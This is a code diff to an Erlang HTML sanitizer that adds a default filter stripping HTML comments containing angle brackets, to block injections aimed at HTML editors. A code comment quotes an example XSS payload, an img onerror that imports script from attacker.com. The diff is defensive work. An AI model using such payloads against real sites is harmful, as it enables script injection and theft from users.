@@ -891,7 +891,7 @@ sanitize({Elt,Attrs,Enclosed}, Stack, ExtraElts, ExtraAttrs, Options) ->
     end.
 
 sanitize_element(Element, Stack, Options) ->
-    Callback = proplists:get_value(element, Options, fun(E) -> E end),
+    Callback = proplists:get_value(element, Options, fun sanitize_element_int/1),
     sanitize_element(Callback, Element, Stack, Options).
 
 sanitize_element(F, Element, _Stack, _Options) when is_function(F, 1) ->
@@ -903,6 +903,15 @@ sanitize_element(F, Element, Stack, Options) when is_function(F, 3) ->
 sanitize_element({M, F, A}, Element, Stack, _Options) ->
     erlang:apply(M, F, [Element, Stack|A]).
 
+sanitize_element_int({comment, Comment} = E) ->
+    % Remove comments that might contain injections for e.g. html editors.
+    % For example: <!--data-mce-selected="x"->"><img src onerror=import('//attacker.com')>-->
+    case binary:match(Comment, [ <<"<">>, <<">">> ]) of
+        nomatch -> E;
+        _ -> <<>>
+    end;
+sanitize_element_int(E) ->
+    E.
 
 %% @doc Flatten the sanitized html tree to a binary - the attributes are already filtered
 %% using the allow_attr/1 whitelist.
